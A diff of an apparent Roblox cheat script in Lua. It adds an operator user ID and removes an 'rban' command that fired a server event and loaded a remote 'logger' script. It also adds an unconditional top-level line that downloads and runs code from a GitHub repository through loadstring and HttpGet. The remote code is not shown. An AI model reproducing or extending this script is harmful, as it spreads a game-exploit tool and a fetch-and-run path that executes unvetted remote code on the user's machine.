@@ -9,6 +9,7 @@ getgenv().Operator =
 2003508283,
 1607571434,
 3171529598,
+1001587711,
 }
 getgenv().Droppers = game.Players.LocalPlayer
 
@@ -262,14 +263,6 @@ local function main_cmds(msg,plr)
                 elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                     game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
                 end
-            elseif cmd[1] == Prefix.."rban" then
-                if cmd[2] == "." then
-                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
-                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
-                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
-		        end
             end
         end
     end
@@ -290,6 +283,8 @@ game.Players.PlayerAdded:Connect(function(plr)
         end)
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/Commands2/main/Script"))()
 
 if game.Players.LocalPlayer.UserId == 0 then
 game.Players.LocalPlayer:Kick("Blacklisted | Please DM KaiW#4990 or FrostyW#9330 for help, If neither of them respond join our discord: .gg/C2eTqjK9dp")
